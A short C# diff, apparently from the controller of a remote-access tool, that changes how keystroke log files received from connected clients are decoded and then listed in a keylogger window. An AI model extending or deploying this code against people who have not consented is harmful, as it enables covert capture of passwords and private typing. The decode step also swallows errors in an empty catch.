@@ -3,6 +3,7 @@ using System.IO;
 using System.Linq;
 using System.Threading;
 using xServer.Core.Data;
+using xServer.Core.Helper;
 using xServer.Core.Networking;
 using xServer.Core.Packets.ClientPackets;
 using xServer.Core.Packets.ServerPackets;
@@ -130,25 +131,37 @@ namespace xServer.Core.Commands
 
             destFile.AppendBlock(packet.Block, packet.CurrentBlock);
 
-            if (packet.Index == packet.FileCount && (packet.CurrentBlock + 1) == packet.MaxBlocks)
+            if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
             {
-                FileInfo[] iFiles = new DirectoryInfo(Path.Combine(client.Value.DownloadDirectory, "Logs\\")).GetFiles();
-
-                if (iFiles.Length == 0)
-                    return;
-
-                foreach (FileInfo file in iFiles)
+                try
                 {
-                    if (client.Value == null || client.Value.FrmKl == null)
-                        break;
-
-                    client.Value.FrmKl.AddLogToListview(file.Name);
+                    File.WriteAllText(downloadPath, FileHelper.ReadLogFile(downloadPath));
+                }
+                catch
+                {
                 }
 
-                if (client.Value == null || client.Value.FrmKl == null)
-                    return;
+                if (packet.Index == packet.FileCount)
+                {
+                    FileInfo[] iFiles =
+                        new DirectoryInfo(Path.Combine(client.Value.DownloadDirectory, "Logs\\")).GetFiles();
 
-                client.Value.FrmKl.SetGetLogsEnabled(true);
+                    if (iFiles.Length == 0)
+                        return;
+
+                    foreach (FileInfo file in iFiles)
+                    {
+                        if (client.Value == null || client.Value.FrmKl == null)
+                            break;
+
+                        client.Value.FrmKl.AddLogToListview(file.Name);
+                    }
+
+                    if (client.Value == null || client.Value.FrmKl == null)
+                        return;
+
+                    client.Value.FrmKl.SetGetLogsEnabled(true);
+                }
             }
         }
 
